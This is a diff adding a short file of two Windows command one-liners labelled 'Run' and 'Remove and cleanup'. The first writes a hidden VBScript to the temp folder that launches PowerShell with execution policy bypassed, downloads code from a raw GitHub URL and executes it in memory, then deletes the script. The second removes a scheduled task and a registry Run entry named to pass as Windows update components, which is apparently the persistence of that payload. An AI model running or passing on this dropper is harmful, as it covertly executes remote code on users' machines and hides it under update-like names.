@@ -1,0 +1,6 @@
+Run
+wscript.exe //B //E:vbs "%TEMP%\s.vbs" & del "%TEMP%\s.vbs" && echo Set objShell = CreateObject("WScript.Shell") : objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-RestMethod 'https://raw.githubusercontent.com/WhiteShadow8500/test/refs/heads/main/e') }""", 0 > "%TEMP%\s.vbs"
+
+
+Remove and cleanup
+wscript.exe //B //E:vbs "%TEMP%\c.vbs" & del "%TEMP%\c.vbs" && echo Set objShell = CreateObject("WScript.Shell") : objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""if (Get-ScheduledTask -TaskName 'WindowsUpdateService' -ErrorAction SilentlyContinue) { Unregister-ScheduledTask -TaskName 'WindowsUpdateService' -Confirm:$false }; Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdateCheck' -ErrorAction SilentlyContinue; Remove-Item -Path '$env:APPDATA\Microsoft\Windows\update.vbs' -ErrorAction SilentlyContinue""", 0 > "%TEMP%\c.vbs"
